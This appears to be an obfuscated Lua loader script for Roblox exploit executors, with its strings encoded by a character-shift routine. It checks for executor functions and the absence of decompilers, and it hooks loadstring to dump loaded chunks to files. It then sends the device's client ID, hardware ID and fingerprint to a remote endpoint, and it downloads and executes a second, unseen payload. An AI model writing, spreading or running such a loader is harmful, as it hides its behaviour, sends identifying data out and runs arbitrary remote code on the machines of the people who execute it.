local _YTNxiBFl=function(t,k)local r={}for i=1,#t do r[i]=string.char((t[i]-k)%256)end return table.concat(r)end
local _rAZsJFz=function()local ok=true local c={} c[1]=function()return type(game)=="userdata"end c[2]=function()return type(getgenv)=="function"end c[3]=function()return type(gethwid)=="function"end c[4]=function()return type(loadstring)=="function" or type(load)=="function"end c[5]=function()local fn=function()end local s=string.dump(fn) return type(s)=="string" and #s>0 end c[6]=function()local t=debug.traceback("") return type(t)=="string" and #t>5 end c[7]=function()return decompile==nil and Decompiler==nil end for i=1,#c do local s,r=pcall(c[i]) if not s or not r then ok=false break end end return ok end
if not _rAZsJFz()then return end
pcall(function()local idx=0 local old=getgenv().loadstring or loadstring if old then local hk=function(chunk,...)if typeof(chunk)=="string" then pcall(function()writefile("lf_"..tostring(idx)..".txt",chunk)end)end idx=idx+1 return old(chunk,...)end getgenv().loadstring=newcclosure and newcclosure(hk) or hk end end)
local _miBVsWCPh=30911
local _LzuzkM=1085819
if _miBVsWCPh>_LzuzkM then return end
local _ZsWTnFOl=_YTNxiBFl({208,202,195,214,206,209,212,222,210,155,156,219,204,150,219,207,208,203,219},100)
local _rbknheW=_YTNxiBFl({219,231,231,227,230,173,162,162,213,212,230,216,167,167,160,215,220,230,227,212,231,214,219,216,229,160,227,229,226,215,232,214,231,220,226,225,161,213,212,230,216,167,167,161,234,226,229,222,216,229,230,161,215,216,233,162,217,232,225,214,231,220,226,225,230,162,212,232,231,219,226,229,220,237,216},115)
local _BATltw=_YTNxiBFl({190,202,202,198,201,144,133,133,184,183,201,187,138,138,131,186,191,201,198,183,202,185,190,187,200,131,198,200,197,186,203,185,202,191,197,196,132,184,183,201,187,138,138,132,205,197,200,193,187,200,201,132,186,187,204,133,188,203,196,185,202,191,197,196,201,133,186,187,194,191,204,187,200},86)
local _LAZrMO=(syn and syn.request)or http_request or(http and http.request)or request
if not _LAZrMO then return end
local _ZeunijUy=game:GetService(_YTNxiBFl({40,84,84,80,51,69,82,86,73,67,69},224))
local function _OoBGpz(v2)return _ZeunijUy:JSONEncode(v2)end
local function _JgQnQgDl(v2)return _ZeunijUy:JSONDecode(v2)end
local function _ctehIprD()return string.format(_YTNxiBFl({99,182,99,182},62),os.time(),math.random(1,999999999))end
local _CQRrGwpD=_ctehIprD()
local _jKILxfV={}
pcall(function()table.insert(_jKILxfV,{source=_YTNxiBFl({157,166,163,159,168,174,153,163,158},58),value=tostring(game:GetService(_YTNxiBFl({147,163,185,130,175,162,173,186,181,170,164,180,148,166,179,183,170,164,166},65)):GetClientId())})end)
pcall(function()table.insert(_jKILxfV,{source=_YTNxiBFl({40,59,40,38,56,55,50,53,34,43,58,44,39},195),value=tostring(gethwid())})end)
pcall(function()table.insert(_jKILxfV,{source=_YTNxiBFl({195,197,192,192,191,194,196,181,180,175,182,177,188,188,178,177,179,187},80),value=tostring(getfingerprint and getfingerprint() or "")})end)
local _ugUljtk=_OoBGpz({publicId=_ZsWTnFOl,nonce=_CQRrGwpD,deviceIdentity={candidates=_jKILxfV}})
local _QRJrJRi=_LAZrMO({url=_rbknheW,method=_YTNxiBFl({214,213,217,218},134),headers={[_YTNxiBFl({238,26,25,31,16,25,31,216,255,36,27,16},171)]=_YTNxiBFl({151,166,166,162,159,153,151,170,159,165,164,101,160,169,165,164},54),body=_ugUljtk})
local _XLBYXQh=_QRJrJRi.Body or _QRJrJRi.body or _QRJrJRi.Content or _QRJrJRi.content or""
local _LKdjRG=_JgQnQgDl(_XLBYXQh)
if not _LKdjRG or not _LKdjRG.ticket then return end
local _aLOyaYPi=_OoBGpz({ticket=_LKdjRG.ticket,challenge=_LKdjRG.challenge,nonce=_CQRrGwpD,sessionId=_LKdjRG.sessionId})
local _mFoUKkSX=_LAZrMO({url=_BATltw,method=_YTNxiBFl({127,126,130,131},47),headers={[_YTNxiBFl({136,180,179,185,170,179,185,114,153,190,181,170},69)]=_YTNxiBFl({134,149,149,145,142,136,134,153,142,148,147,84,143,152,148,147},37),body=_aLOyaYPi})
local _TQRpoWwGl=_mFoUKkSX.Body or _mFoUKkSX.body or _mFoUKkSX.Content or _mFoUKkSX.content or""
local _QbZSsP=loadstring or load
if _QbZSsP and #_TQRpoWwGl>0 then _QbZSsP(_TQRpoWwGl)()end